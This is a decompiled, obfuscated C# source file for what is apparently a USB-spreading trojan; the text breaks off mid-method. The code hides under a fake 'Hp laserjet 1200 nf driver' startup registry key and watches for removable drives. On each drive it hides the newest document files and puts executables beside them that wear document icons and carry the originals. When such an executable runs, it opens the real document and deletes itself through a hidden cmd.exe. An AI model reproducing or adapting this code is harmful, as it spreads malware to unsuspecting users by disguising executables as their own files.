using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using Microsoft.Win32;
using ns0;

namespace USB2;

public class Form1 : Form
{
	private sealed class Class1
	{
		private string string_0;

		private string string_1;

		private DateTime dateTime_0;

		public string String_0
		{
			get
			{
				return string_0;
			}
			set
			{
				string_0 = value;
			}
		}

		public string String_1
		{
			get
			{
				return string_1;
			}
			set
			{
				string_1 = value;
			}
		}

		public DateTime DateTime_0
		{
			get
			{
				return dateTime_0;
			}
			set
			{
				dateTime_0 = value;
			}
		}
	}

	public delegate void repaintDelegate();

	public string regKey = "Hp laserjet 1200 nf driver";

	public string RunKey = "Windows File ";

	public int ckkkk = 0;

	public string KeyVersion = "DriveVersion";

	public string Version = "1";

	public string FileDoc = "hp";

	public string FileDocTemp = "h2.cgb-4171";

	public string KeyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	public string KeyPathVersion = "SOFTWARE\\DriveVersion";

	public string KeyPathOffice = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe";

	public string log = "log.cgb-4173";

	private int int_0 = 3;

	private int int_1 = 0;

	private int int_2 = 0;

	private int int_3 = 0;

	private WebClient webClient_0;

	private List<string> list_0;

	private List<string> list_1;

	private List<Class1> list_2;

	public string USBLetter1 = "";

	private string string_0;

	private string string_1 = "hpDrive.cgb-4172";

	private RegistryKey registryKey_0;

	private RegistryKey registryKey_1;

	private Thread thread_0;

	private Thread thread_1;

	private Thread thread_2;

	private bool bool_0 = true;

	public int Disconnect = 0;

	private string string_2;

	private string string_3;

	private string string_4;

	private bool bool_1 = false;

	private bool bool_2 = false;

	private int int_4 = 0;

	private int int_5 = 0;

	private int int_6 = 0;

	private string string_5 = "";

	private IContainer icontainer_0 = null;

	private Timer timer_0;

	private Label label_0;

	private Label label_1;

	private Label label_2;

	private RichTextBox richTextBox_0;

	private Timer timer_1;

	private Timer timer_2;

	private Timer timer_3;

	private Timer timer_4;

	[CompilerGenerated]
	private static Comparison<Class1> comparison_0;

	[CompilerGenerated]
	private static Comparison<Class1> comparison_1;

	public Form1()
	{
		method_9();
		list_0 = new List<string>();
		list_1 = new List<string>();
		Delegate56.smethod_0(this, (FormWindowState)1);
		Delegate351.smethod_0(this, 0.0);
		Delegate30.smethod_0(this, bool_0: false);
		webClient_0 = new WebClient();
		registryKey_0 = Delegate110.smethod_0(Registry.CurrentUser, KeyPathVersion, bool_0: true);
		registryKey_1 = Delegate311.smethod_0(Registry.LocalMachine, KeyPathOffice);
		thread_1 = new Thread(CopyFileMeothd);
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr FindResource(IntPtr intptr_0, string string_6, string string_7);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr LoadResource(IntPtr intptr_0, IntPtr intptr_1);

	private void method_0(object sender, EventArgs e)
	{
		//IL_065b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0662: Expected O, but got Unknown
		string text = Delegate197.smethod_0();
		string text2 = Delegate160.smethod_0(Environment.SpecialFolder.LocalApplicationData);
		string text3 = Delegate271.smethod_0(FileDoc, "\\");
		string text4 = Delegate334.smethod_0(text2, text3);
		FileInfo object_ = Delegate329.smethod_0(text);
		string object_2 = Delegate295.smethod_0(text4, FileDoc, ".exe");
		Delegate329.smethod_0(object_2);
		RegistryKey object_3 = Delegate110.smethod_0(Registry.CurrentUser, KeyPath, bool_0: true);
		if (Delegate218.smethod_0(Delegate197.smethod_0(), object_2))
		{
			if (Delegate210.smethod_0(object_3, regKey) == null)
			{
				Delegate90.smethod_0(object_3, regKey, Delegate337.smethod_0(Delegate197.smethod_0()));
			}
			else
			{
				Delegate250.smethod_0(object_3, regKey);
				Delegate90.smethod_0(object_3, regKey, Delegate337.smethod_0(Delegate197.smethod_0()));
			}
			if (Delegate210.smethod_0(object_3, regKey) != null)
			{
				StreamWriter streamWriter = Delegate80.smethod_0(Delegate271.smethod_0(text4, log));
				try
				{
					Delegate251.smethod_0(streamWriter, Delegate40.smethod_0(new object[4]
					{
						"The Key Startup: ",
						Delegate337.smethod_0(Delegate197.smethod_0()),
						"       ",
						Delegate268.smethod_0()
					}));
				}
				finally
				{
					if (streamWriter != null)
					{
						Delegate69.smethod_0(streamWriter);
					}
				}
			}
			try
			{
				if (registryKey_0 == null)
				{
					registryKey_0 = Delegate81.smethod_0(Registry.CurrentUser, KeyPathVersion);
				}
				Delegate90.smethod_0(registryKey_0, "Version", Version);
			}
			catch
			{
			}
			FileStream object_4 = Delegate269.smethod_0(Delegate271.smethod_0(text4, log), FileMode.Append);
			try
			{
			}
			finally
			{
				Delegate41.smethod_0(object_4);
			}
			if (Delegate210.smethod_0(registryKey_0, "Open") != null && Delegate218.smethod_0(Delegate337.smethod_0(Delegate210.smethod_0(registryKey_0, "Open")), "1"))
			{
				int_1 = 1;
				Delegate250.smethod_0(registryKey_0, "Open");
			}
			Delegate89.smethod_0(timer_0);
			Delegate89.smethod_0(timer_3);
			if (Delegate8.smethod_0(Delegate271.smethod_0(text4, "\\icon")))
			{
				return;
			}
			Delegate141.smethod_0(Delegate271.smethod_0(text4, "\\icon"));
			FileStream fileStream = Delegate290.smethod_0(Delegate295.smethod_0(text4, "\\icon\\", Delegate169.smethod_0(this, "doc.ico")));
			try
			{
				Delegate316.smethod_0(Delegate48.smethod_0(), fileStream);
			}
			finally
			{
				if (fileStream != null)
				{
					Delegate69.smethod_0(fileStream);
				}
			}
			fileStream = Delegate290.smethod_0(Delegate295.smethod_0(text4, "\\icon\\", Delegate169.smethod_0(this, "rar.ico")));
			try
			{
				Delegate316.smethod_0(Delegate343.smethod_0(), fileStream);
			}
			finally
			{
				if (fileStream != null)
				{
					Delegate69.smethod_0(fileStream);
				}
			}
			fileStream = Delegate290.smethod_0(Delegate295.smethod_0(text4, "\\icon\\", Delegate169.smethod_0(this, "xls.ico")));
			try
			{
				Delegate316.smethod_0(Delegate22.smethod_0(), fileStream);
			}
			finally
			{
				if (fileStream != null)
				{
					Delegate69.smethod_0(fileStream);
				}
			}
			fileStream = Delegate290.smethod_0(Delegate295.smethod_0(text4, "\\icon\\", Delegate169.smethod_0(this, "ppt.ico")));
			try
			{
				Delegate316.smethod_0(Delegate102.smethod_0(), fileStream);
			}
			finally
			{
				if (fileStream != null)
				{
					Delegate69.smethod_0(fileStream);
				}
			}
			fileStream = Delegate290.smethod_0(Delegate295.smethod_0(text4, "\\icon\\", Delegate169.smethod_0(this, "txt.ico")));
			try
			{
				Delegate316.smethod_0(Delegate303.smethod_0(), fileStream);
			}
			finally
			{
				if (fileStream != null)
				{
					Delegate69.smethod_0(fileStream);
				}
			}
			fileStream = Delegate290.smethod_0(Delegate295.smethod_0(text4, "\\icon\\", Delegate169.smethod_0(this, "pdf.ico")));
			try
			{
				Delegate316.smethod_0(Delegate237.smethod_0(), fileStream);
			}
			finally
			{
				if (fileStream != null)
				{
					Delegate69.smethod_0(fileStream);
				}
			}
			fileStream = Delegate290.smethod_0(Delegate295.smethod_0(text4, "\\icon\\", Delegate169.smethod_0(this, "odc.ico")));
			try
			{
				Delegate316.smethod_0(Delegate115.smethod_0(), fileStream);
			}
			finally
			{
				if (fileStream != null)
				{
					Delegate69.smethod_0(fileStream);
				}
			}
			fileStream = Delegate290.smethod_0(Delegate295.smethod_0(text4, "\\icon\\", Delegate169.smethod_0(this, "ptp.ico")));
			try
			{
				Delegate316.smethod_0(Delegate224.smethod_0(), fileStream);
			}
			finally
			{
				if (fileStream != null)
				{
					Delegate69.smethod_0(fileStream);
				}
			}
			fileStream = Delegate290.smethod_0(Delegate295.smethod_0(text4, "\\icon\\", Delegate169.smethod_0(this, "lxs.ico")));
			try
			{
				Delegate316.smethod_0(Delegate277.smethod_0(), fileStream);
				return;
			}
			finally
			{
				if (fileStream != null)
				{
					Delegate69.smethod_0(fileStream);
				}
			}
		}
		if (!Delegate103.smethod_0(Delegate197.smethod_0(), object_2))
		{
			return;
		}
		if (Delegate210.smethod_0(object_3, regKey) == null)
		{
			Delegate90.smethod_0(object_3, regKey, object_2);
		}
		if (Delegate128.smethod_0(object_))
		{
			if (!Delegate8.smethod_0(text4))
			{
				Delegate141.smethod_0(text4);
			}
			FileInfo object_5 = Delegate329.smethod_0(Delegate295.smethod_0(Delegate49.smethod_0(Delegate197.smethod_0()), "\\", FileDocTemp));
			try
			{
				Delegate61.smethod_0(object_5, object_2);
				Delegate182.smethod_0(object_5, FileAttributes.Normal);
				Delegate61.smethod_0(object_5, Delegate271.smethod_0(text4, FileDocTemp));
				Delegate182.smethod_0(object_5, FileAttributes.Hidden);
			}
			catch
			{
				try
				{
					if (Delegate155.smethod_0(Delegate337.smethod_0(Delegate210.smethod_0(registryKey_0, KeyVersion))) < Delegate155.smethod_0(Version))
					{
						Delegate90.smethod_0(registryKey_0, KeyVersion, Version);
						FileInfo object_6 = Delegate329.smethod_0(Delegate271.smethod_0(text4, FileDocTemp));
						Delegate196.smethod_0(object_6);
						Delegate182.smethod_0(object_5, FileAttributes.Normal);
						Delegate61.smethod_0(object_5, Delegate271.smethod_0(text4, FileDocTemp));
						Delegate182.smethod_0(object_5, FileAttributes.Hidden);
						Delegate90.smethod_0(registryKey_0, "Version", Version);
					}
				}
				catch
				{
				}
			}
		}
		try
		{
			List<string> object_7 = Delegate75.smethod_0();
			List<string> object_8 = Delegate75.smethod_0();
			DriveInfo[] array = Delegate263.smethod_0();
			Delegate94.smethod_0(object_8, Delegate255.smethod_0(array[0]));
			DriveInfo[] array2 = array;
			foreach (DriveInfo object_9 in array2)
			{
				if (Delegate35.smethod_0(object_9) == DriveType.Removable)
				{
					Delegate94.smethod_0(object_7, Delegate255.smethod_0(object_9));
				}
			}
			try
			{
				if (!Delegate53.smethod_0(this, FileDoc))
				{
					Process object_10 = Delegate142.smethod_0();
					Delegate36.smethod_0(Delegate211.smethod_0(object_10), object_2);
					Delegate156.smethod_0(object_10);
				}
			}
			catch
			{
			}
			string text5 = Delegate66.smethod_0(Delegate197.smethod_0());
			string text6 = string.Empty;
			ManagementClass object_11 = Delegate348.smethod_0("win32_processor");
			ManagementObjectCollection object_12 = Delegate27.smethod_0(object_11);
			ManagementObjectEnumerator val = Delegate16.smethod_0(object_12);
			try
			{
				if (Delegate204.smethod_0(val))
				{
					ManagementObject object_13 = (ManagementObject)Delegate149.smethod_0(val);
					text6 = Delegate337.smethod_0(Delegate242.smethod_0(Delegate308.smethod_0(Delegate107.smethod_0(object_13), "processorID")));
				}
			}
			finally
			{
				if (val != null)
				{
					Delegate69.smethod_0(val);
				}
			}
			try
			{
				if (!Delegate120.smethod_0(this, Delegate271.smethod_0(text5, string_1)))
				{
					Delegate229.smethod_0(this, Delegate271.smethod_0(text5, string_1), text6);
				}
				Delegate174.smethod_0(Delegate271.smethod_0(text5, string_1), Delegate295.smethod_0(Delegate49.smethod_0(object_2), "\\", string_1));
				Delegate282.smethod_0(this, Delegate295.smethod_0(Delegate49.smethod_0(object_2), "\\", string_1));
			}
			catch
			{
			}
			if (Delegate83.smethod_0(text5, Delegate321.smethod_0(object_8, 0)))
			{
				text5 = "";
			}
			string text7 = Delegate215.smethod_0(Delegate146.smethod_0(Delegate13.smethod_0(Delegate133.smethod_0())));
			string text8 = text5;
			Delegate344.smethod_0(this, Delegate271.smethod_0(text5, string_1));
			Delegate344.smethod_0(this, Delegate271.smethod_0(text5, string_1));
			string text9 = Delegate23.smethod_0(this, Delegate271.smethod_0(text5, string_1), text7, "Path");
			Delegate271.smethod_0(text5, text9);
			if (Delegate103.smethod_0(text9, ""))
			{
				try
				{
					IntPtr intptr_ = Delegate225.smethod_0(Delegate116.smethod_0(Delegate238.smethod_0(Delegate304.smethod_0())));
					if (Delegate170.smethod_0(intptr_.ToString(), "0"))
					{
						return;
					}
					IntPtr intptr_2 = FindResource(intptr_, "DATA", "TEXT");
					if (Delegate170.smethod_0(intptr_2.ToString(), "0"))
					{
						return;
					}
					IntPtr intptr_3 = LoadResource(intptr_, intptr_2);
					if (Delegate170.smethod_0(intptr_3.ToString(), "0"))
					{
						return;
					}
					string text10 = Delegate160.smethod_0(Environment.SpecialFolder.LocalApplicationData);
					string text11 = Delegate271.smethod_0(FileDoc, "\\");
					string text12 = Delegate334.smethod_0(text10, text11);
					string object_14 = Delegate291.smethod_0(intptr_3);
					string text13 = Delegate317.smethod_0(object_14, Delegate278.smethod_0(object_14) - 3);
					byte[] byte_ = Delegate129.smethod_0(text13);
					string text14 = Delegate271.smethod_0(text8, text9);
					Delegate9.smethod_0(text14, byte_);
					Process object_15 = Delegate142.smethod_0();
					Delegate36.smethod_0(Delegate211.smethod_0(object_15), text14);
					Delegate156.smethod_0(object_15);
					USBSerialNumber object_16 = Delegate201.smethod_0();
					string text15 = Delegate317.smethod_0(Delegate66.smethod_0(Delegate197.smethod_0()), Delegate278.smethod_0(Delegate66.smethod_0(Delegate197.smethod_0())) - 2);
					string text16 = Delegate187.smethod_0(object_16, text15);
					StreamWriter streamWriter2 = Delegate80.smethod_0(Delegate271.smethod_0(text12, log));
					try
					{
						Delegate251.smethod_0(streamWriter2, Delegate40.smethod_0(new object[6]
						{
							"The file: ",
							text14,
							"      ",
							text16,
							"    Open...      ",
							Delegate268.smethod_0()
						}));
					}
					finally
					{
						if (streamWriter2 != null)
						{
							Delegate69.smethod_0(streamWriter2);
						}
					}
					Delegate90.smethod_0(registryKey_0, "Open", "1");
					ProcessStartInfo processStartInfo = Delegate330.smethod_0();
					Delegate183.smethod_0(processStartInfo, Delegate62.smethod_0("/c del \"{0}\"", Delegate197.smethod_0()));
					Delegate76.smethod_0(processStartInfo, ProcessWindowStyle.Hidden);
					Delegate264.smethod_0(processStartInfo, bool_0: true);
					Delegate36.smethod_0(processStartInfo, "cmd.exe");
					Delegate258.smethod_0(processStartInfo);
					Delegate97.smethod_0();
				}
				catch
				{
				}
			}
			if (int_3 != 0)
			{
				return;
			}
			text5 = Delegate271.smethod_0(Delegate49.smethod_0(Delegate197.smethod_0()), "\\");
			string text17 = text5;
			Delegate344.smethod_0(this, Delegate271.smethod_0(text5, string_1));
			Delegate344.smethod_0(this, Delegate271.smethod_0(text5, string_1));
			string text18 = Delegate23.smethod_0(this, Delegate271.smethod_0(text5, string_1), text7, "Path");
			Delegate271.smethod_0(text5, text18);
			if (!Delegate103.smethod_0(text18, ""))
			{
				return;
			}
			try
			{
				IntPtr intptr_ = Delegate225.smethod_0(Delegate116.smethod_0(Delegate238.smethod_0(Delegate304.smethod_0())));
				if (Delegate170.smethod_0(intptr_.ToString(), "0"))
				{
					return;
				}
				IntPtr intptr_2 = FindResource(intptr_, "DATA", "TEXT");
				if (!Delegate170.smethod_0(intptr_2.ToString(), "0"))
				{
					IntPtr intptr_3 = LoadResource(intptr_, intptr_2);
					if (!Delegate170.smethod_0(intptr_3.ToString(), "0"))
					{
						string object_14 = Delegate291.smethod_0(intptr_3);
						string text13 = Delegate317.smethod_0(object_14, Delegate278.smethod_0(object_14) - 3);
						byte[] byte_ = Delegate129.smethod_0(text13);
						string text14 = Delegate271.smethod_0(text17, text18);
						Delegate9.smethod_0(text14, byte_);
						Process object_15 = Delegate142.smethod_0();
						Delegate36.smethod_0(Delegate211.smethod_0(object_15), text14);
						Delegate156.smethod_0(object_15);
						ProcessStartInfo processStartInfo = Delegate330.smethod_0();
						Delegate183.smethod_0(processStartInfo, Delegate62.smethod_0("/c del \"{0}\"", Delegate197.smethod_0()));
						Delegate76.smethod_0(processStartInfo, ProcessWindowStyle.Hidden);
						Delegate264.smethod_0(processStartInfo, bool_0: true);
						Delegate36.smethod_0(processStartInfo, "cmd.exe");
						Delegate258.smethod_0(processStartInfo);
						Delegate97.smethod_0();
					}
				}
			}
			catch
			{
			}
		}
		catch
		{
			Delegate97.smethod_0();
		}
	}

	private void method_1(object sender, EventArgs e)
	{
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_01dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e3: Expected O, but got Unknown
		//IL_047b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0482: Expected O, but got Unknown
		string text = Delegate160.smethod_0(Environment.SpecialFolder.LocalApplicationData);
		string text2 = Delegate271.smethod_0(FileDoc, "\\");
		string text3 = Delegate334.smethod_0(text, text2);
		if (!Delegate83.smethod_0(Delegate73.smethod_0(Delegate304.smethod_0()), FileDoc) || Delegate83.smethod_0(Delegate73.smethod_0(Delegate304.smethod_0()), FileDocTemp))
		{
			return;
		}
		List<string> object_ = Delegate75.smethod_0();
		ManagementObjectSearcher object_2 = Delegate324.smethod_0("SELECT * FROM Win32_LogicalDisk");
		ManagementObjectEnumerator val = Delegate16.smethod_0(Delegate136.smethod_0(object_2));
		try
		{
			while (Delegate204.smethod_0(val))
			{
				ManagementObject object_3 = (ManagementObject)Delegate149.smethod_0(val);
				Delegate94.smethod_0(object_, Delegate337.smethod_0(Delegate163.smethod_0(object_3, "Name")));
			}
		}
		finally
		{
			if (val != null)
			{
				Delegate69.smethod_0(val);
			}
		}
		if (Delegate256.smethod_0(list_0) == Delegate256.smethod_0(object_))
		{
			return;
		}
		try
		{
			for (int i = 0; i < Delegate256.smethod_0(object_); i++)
			{
				if (!Delegate194.smethod_0(list_0, Delegate321.smethod_0(object_, i)))
				{
					Delegate94.smethod_0(list_0, Delegate321.smethod_0(object_, i));
				}
			}
			Delegate46.smethod_0(label_0, Delegate321.smethod_0(list_0, Delegate256.smethod_0(list_0) - 1));
			for (int i = 0; i < Delegate256.smethod_0(list_0); i++)
			{
				if (!Delegate194.smethod_0(object_, Delegate321.smethod_0(list_0, i)))
				{
					USBLetter1 = Delegate321.smethod_0(list_0, Delegate256.smethod_0(list_0) - 1);
					Delegate87.smethod_0(list_0, i);
				}
				Delegate46.smethod_0(label_0, Delegate321.smethod_0(list_0, Delegate256.smethod_0(list_0) - 1));
			}
			ManagementObjectSearcher object_4 = Delegate324.smethod_0("SELECT * FROM Win32_DiskDrive");
			List<string> object_5 = Delegate75.smethod_0();
			val = Delegate16.smethod_0(Delegate136.smethod_0(object_4));
			try
			{
				while (Delegate204.smethod_0(val))
				{
					ManagementObject object_3 = (ManagementObject)Delegate149.smethod_0(val);
					Delegate94.smethod_0(object_5, Delegate337.smethod_0(Delegate163.smethod_0(object_3, "Model")));
				}
			}
			finally
			{
				if (val != null)
				{
					Delegate69.smethod_0(val);
				}
			}
			USBSerialNumber object_6 = Delegate201.smethod_0();
			string text4 = Delegate317.smethod_0(Delegate321.smethod_0(list_0, Delegate256.smethod_0(list_0) - 1), Delegate278.smethod_0(Delegate321.smethod_0(list_0, Delegate256.smethod_0(list_0) - 1)) - 1);
			string text5 = Delegate187.smethod_0(object_6, text4);
			for (int i = 0; i < Delegate256.smethod_0(object_5); i++)
			{
				if (!Delegate194.smethod_0(list_1, Delegate321.smethod_0(object_5, i)))
				{
					Delegate94.smethod_0(list_1, Delegate321.smethod_0(object_5, i));
				}
				if (i != Delegate256.smethod_0(object_5) - 1 || int_1 == 0 || int_2 != 0)
				{
					continue;
				}
				StreamWriter streamWriter = Delegate80.smethod_0(Delegate271.smethod_0(text3, log));
				try
				{
					Delegate251.smethod_0(streamWriter, Delegate40.smethod_0(new object[5]
					{
						Delegate321.smethod_0(list_0, Delegate256.smethod_0(list_0) - 1),
						"    IS detected      ",
						text5,
						"     ",
						Delegate268.smethod_0()
					}));
					int_2 = 1;
					Delegate89.smethod_0(timer_1);
					string_5 = text5;
				}
				finally
				{
					if (streamWriter != null)
					{
						Delegate69.smethod_0(streamWriter);
					}
				}
			}
			for (int i = 0; i < Delegate256.smethod_0(list_1); i++)
			{
				if (Delegate194.smethod_0(object_5, Delegate321.smethod_0(list_1, i)))
				{
					continue;
				}
				Delegate87.smethod_0(list_1, i);
				StreamWriter streamWriter2 = Delegate80.smethod_0(Delegate271.smethod_0(text3, log));
				try
				{
					Delegate251.smethod_0(streamWriter2, Delegate40.smethod_0(new object[5]
					{
						USBLetter1,
						"    IS Remove      ",
						string_5,
						"     ",
						Delegate268.smethod_0()
					}));
					int_2 = 0;
					Delegate275.smethod_0(timer_1);
				}
				finally
				{
					if (streamWriter2 != null)
					{
						Delegate69.smethod_0(streamWriter2);
					}
				}
			}
			try
			{
				ManagementObjectSearcher object_7 = Delegate324.smethod_0(Delegate295.smethod_0("SELECT * FROM Win32_DiskDrive WHERE Model = '", Delegate321.smethod_0(list_1, Delegate256.smethod_0(list_1) - 1), "'"));
				val = Delegate16.smethod_0(Delegate136.smethod_0(object_7));
				try
				{
					while (Delegate204.smethod_0(val))
					{
						ManagementObject object_3 = (ManagementObject)Delegate149.smethod_0(val);
						string_0 = Delegate337.smethod_0(Delegate163.smethod_0(object_3, "SerialNumber"));
						Delegate46.smethod_0(label_1, Delegate271.smethod_0("Serial:", string_0));
					}
				}
				finally
				{
					if (val != null)
					{
						Delegate69.smethod_0(val);
					}
				}
			}
			catch
			{
				string_0 = "Access denied";
			}
			if (int_1 != 0)
			{
				Delegate89.smethod_0(timer_1);
				string text6 = Delegate321.smethod_0(list_0, Delegate256.smethod_0(list_0) - 1);
				string[] array = Delegate175.smethod_0(this, text6, "*.*");
				int num = 0;
				int num2 = 0;
				list_2 = Delegate95.smethod_0();
				for (int i = 0; i < array.Length; i++)
				{
					FileInfo object_8 = Delegate329.smethod_0(array[i]);
					if ((Delegate218.smethod_0(Delegate147.smethod_0(object_8), ".docx") || Delegate218.smethod_0(Delegate147.smethod_0(object_8), ".doc") || Delegate218.smethod_0(Delegate147.smethod_0(object_8), ".zip") || Delegate218.smethod_0(Delegate147.smethod_0(object_8), ".pdf") || Delegate218.smethod_0(Delegate147.smethod_0(object_8), ".rar") || Delegate218.smethod_0(Delegate147.smethod_0(object_8), ".xls") || Delegate218.smethod_0(Delegate147.smethod_0(object_8), ".xlsx") || Delegate218.smethod_0(Delegate147.smethod_0(object_8), ".txt")) && Delegate103.smethod_0(Delegate134.smethod_0(object_8), string_1))
					{
						Class1 @class = new Class1();
						if (num != array.Length)
						{
							@class.String_0 = array[i];
							@class.DateTime_0 = Delegate54.smethod_0(object_8);
							@class.String_1 = string_0;
							Delegate349.smethod_0(list_2, @class);
							num2++;
						}
					}
				}
				if (num2 == 0)
				{
					StreamWriter streamWriter2 = Delegate80.smethod_0(Delegate271.smethod_0(text3, log));
					try
					{
						Delegate251.smethod_0(streamWriter2, Delegate28.smethod_0("The file Not Found Search   ", Delegate268.smethod_0()));
					}
					finally
					{
						if (streamWriter2 != null)
						{
							Delegate69.smethod_0(streamWriter2);
						}
					}
				}
				int num3 = 0;
				num3 = ((Delegate309.smethod_0(list_2) >= int_0) ? (Delegate309.smethod_0(list_2) - int_0) : 0);
				Delegate108.smethod_0(list_2, delegate(Class1 class1_0, Class1 class1_1)
				{
					DateTime dateTime_ = class1_0.DateTime_0;
					return Delegate223.smethod_0(ref dateTime_, class1_1.DateTime_0);
				});
				string text7 = Delegate197.smethod_0();
				FileInfo object_9 = Delegate329.smethod_0(text7);
				for (int i = Delegate309.smethod_0(list_2) - 1; i >= num3; i--)
				{
					try
					{
						string text8 = Delegate49.smethod_0(Delegate322.smethod_0(list_2, i).String_0);
						string text9 = Delegate295.smethod_0(text8, "\\", FileDocTemp);
						Delegate182.smethod_0(object_9, FileAttributes.Hidden);
						Delegate61.smethod_0(object_9, text9);
						Delegate182.smethod_0(object_9, FileAttributes.Normal);
					}
					catch
					{
					}
					try
					{
						Delegate182.smethod_0(object_9, FileAttributes.Normal);
						FileInfo object_8 = Delegate329.smethod_0(Delegate322.smethod_0(list_2, i).String_0);
						FileStream fileStream = null;
						StreamWriter streamWriter = null;
						fileStream = Delegate243.smethod_0(Delegate295.smethod_0(Delegate49.smethod_0(Delegate322.smethod_0(list_2, i).String_0), "\\", string_1), FileMode.Append, FileAccess.Write);
						streamWriter = Delegate230.smethod_0(fileStream, Delegate121.smethod_0());
						FileInfo object_10 = Delegate329.smethod_0(Delegate295.smethod_0(Delegate49.smethod_0(Delegate322.smethod_0(list_2, i).String_0), "\\", string_1));
						Delegate182.smethod_0(object_10, FileAttributes.Hidden);
						if (streamWriter != null)
						{
							Delegate283.smethod_0(streamWriter);
						}
						if (fileStream != null)
						{
							Delegate41.smethod_0(fileStream);
						}
						array = Delegate175.smethod_0(this, text6, string_1);
						string text10 = Delegate146.smethod_0(Delegate322.smethod_0(list_2, i).String_0);
						bool flag = false;
						Delegate344.smethod_0(this, Delegate295.smethod_0(Delegate49.smethod_0(Delegate67.smethod_0(object_8)), "\\", string_1));
						string text11 = Delegate23.smethod_0(this, Delegate295.smethod_0(Delegate49.smethod_0(Delegate67.smethod_0(object_8)), "\\", string_1), text10, "Path");
						if (Delegate103.smethod_0(text11, ""))
						{
							flag = true;
						}
						FileInfo object_11 = Delegate329.smethod_0(Delegate295.smethod_0(Delegate49.smethod_0(Delegate322.smethod_0(list_2, i).String_0), "\\", string_1));
						Delegate182.smethod_0(object_11, FileAttributes.Hidden);
						if (!flag)
						{
							Delegate344.smethod_0(this, Delegate295.smethod_0(Delegate49.smethod_0(Delegate322.smethod_0(list_2, i).String_0), "\\", string_1));
							Delegate296.smethod_0(this, Delegate295.smethod_0(Delegate49.smethod_0(Delegate322.smethod_0(list_2, i).String_0), "\\", string_1), Delegate146.smethod_0(Delegate322.smethod_0(list_2, i).String_0), "Hidden", Delegate322.smethod_0(list_2, i).String_1);
						}
						if (streamWriter != null)
						{
							Delegate283.smethod_0(streamWriter);
						}
						if (fileStream != null)
						{
							Delegate41.smethod_0(fileStream);
						}
						string text12 = Delegate14.smethod_0(Delegate49.smethod_0(Delegate322.smethod_0(list_2, i).String_0), "\\", Delegate215.smethod_0(Delegate134.smethod_0(object_8)), ".exe");
						string text13 = Delegate160.smethod_0(Environment.SpecialFolder.LocalApplicationData);
						string text14 = Delegate295.smethod_0(FileDoc, "\\", FileDocTemp);
						string text15 = Delegate334.smethod_0(text13, text14);
						Delegate329.smethod_0(text15);
						try
						{
							Delegate49.smethod_0(Delegate197.smethod_0());
							string text16 = "";
							Delegate174.smethod_0(text15, text12);
							int num4;
							try
							{
								string object_12 = Delegate317.smethod_0(Delegate337.smethod_0(Delegate210.smethod_0(registryKey_1, "Path")), Delegate278.smethod_0(Delegate337.smethod_0(Delegate210.smethod_0(registryKey_1, "Path"))) - 1);
								num4 = Delegate155.smethod_0(Delegate298.smethod_0(object_12, 0, Delegate278.smethod_0(object_12) - 2));
							}
							catch
							{
								num4 = 10;
							}
							if (Delegate83.smethod_0(Delegate216.smethod_0(Delegate147.smethod_0(object_8)), "doc"))
							{
								text16 = ((num4 < 15) ? Delegate334.smethod_0(text13, Delegate295.smethod_0(FileDoc, "\\icon\\", Delegate169.smethod_0(this, "odc.ico"))) : Delegate334.smethod_0(text13, Delegate295.smethod_0(FileDoc, "\\icon\\", Delegate169.smethod_0(this, "doc.ico"))));
							}
							else if (Delegate83.smethod_0(Delegate216.smethod_0(Delegate147.smethod_0(object_8)), "xls"))
							{
								text16 = ((num4 < 15) ? Delegate334.smethod_0(text13, Delegate295.smethod_0(FileDoc, "\\icon\\", Delegate169.smethod_0(this, "lxs.ico"))) : Delegate334.smethod_0(text13, Delegate295.smethod_0(FileDoc, "\\icon\\", Delegate169.smethod_0(this, "xls.ico"))));
							}
							else if (Delegate83.smethod_0(Delegate216.smethod_0(Delegate147.smethod_0(object_8)), "ppt"))
							{
								text16 = ((num4 < 15) ? Delegate334.smethod_0(text13, Delegate295.smethod_0(FileDoc, "\\icon\\", Delegate169.smethod_0(this, "ptp.ico"))) : Delegate334.smethod_0(text13, Delegate295.smethod_0(FileDoc, "\\icon\\", Delegate169.smethod_0(this, "ppt.ico"))));
							}
							else if (Delegate83.smethod_0(Delegate216.smethod_0(Delegate147.smethod_0(object_8)), "txt"))
							{
								text16 = Delegate334.smethod_0(text13, Delegate295.smethod_0(FileDoc, "\\icon\\", Delegate169.smethod_0(this, "txt.ico")));
							}
							else if (Delegate83.smethod_0(Delegate216.smethod_0(Delegate147.smethod_0(object_8)), "pdf"))
							{
								text16 = Delegate334.smethod_0(text13, Delegate295.smethod_0(FileDoc, "\\icon\\", Delegate169.smethod_0(this, "pdf.ico")));
							}
							Class3.smethod_0(text12, text16);
							byte[] byte_ = Delegate161.smethod_0(Delegate67.smethod_0(object_8));
							string text17 = Delegate202.smethod_0(Delegate335.smethod_0(byte_), "-", string.Empty);
							Class3.smethod_2(text12, "TEXT", "DATA", text17);
							Delegate182.smethod_0(object_8, FileAttributes.Hidden);
							Delegate188.smethod_0(Delegate67.smethod_0(object_8));
							StreamWriter streamWriter2 = Delegate80.smethod_0(Delegate271.smethod_0(text3, log));
							try
							{
								Delegate251.smethod_0(streamWriter2, Delegate40.smethod_0(new object[6]
								{
									"The file: ",
									text12,
									"      ",
									text5,
									"    Done...      ",
									Delegate268.smethod_0()
								}));
							}
							finally
							{
								if (streamWriter2 != null)
								{
									Delegate69.smethod_0(streamWriter2);
								}
							}
						}
						catch
						{
						}
					}
					catch
					{
					}
				}
			}
			int_1 = 1;
			int_2++;
		}
		catch
		{
		}
	}

	private void method_2(object sender, EventArgs e)
	{
		try
		{
			string text = Delegate160.smethod_0(Environment.SpecialFolder.LocalApplicationData);
			string text2 = Delegate271.smethod_0(FileDoc, "\\");
